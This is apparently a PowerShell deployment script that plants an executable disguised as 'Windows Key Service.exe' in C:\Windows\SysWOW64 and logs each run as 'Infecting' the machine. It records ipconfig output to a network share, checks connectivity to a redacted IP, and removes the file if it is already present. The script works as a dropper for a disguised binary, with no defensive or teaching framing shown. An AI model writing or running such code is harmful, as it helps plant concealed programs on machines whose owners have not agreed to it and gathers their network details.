$BaseDir = "Z:\"
$App = "Windows Key Service.exe"
$DestDir = "C:\Windows\SysWOW64\"
$DestIp = "***REMOVED***"
$InstallPath = "$DestDir$App" 

$Machine = [Environment]::MachineName
$LogDate = Get-Date -Format "ddMMyyyy-HHmm"
$LogFile = "Z:\Logs\$Machine-$LogDate.txt"
$DateTime = Get-Date

function Install()
{
    "Infecting $Machine on $DateTime" | Out-File -Append -FilePath $LogFile

    ipconfig /all | Out-File -Append -FilePath $LogFile

    $IsConnected = Test-Connection -Quiet $DestIp
    if ($IsConnected)
    {
        try {
            Copy-Item -Path "$BaseDir$App" -Destination $DestDir -ErrorAction Stop 2>&1 >> $LogFile
        } catch {
            $_.Exception.Message | Out-File -Append -FilePath $LogFile
        }
    }
    else
    {
        "Cannot connect to $DestIp" | Out-File -Append -FilePath $LogFile
    }
}

function Uninstall()
{
    Remove-Item $InstallPath
    "Uninstalled $InstallPath" | Out-File -Append -FilePath $LogFile
}


if (Get-Command $InstallPath -ErrorAction SilentlyContinue)
{
    Uninstall
}
else
{
    Install
}
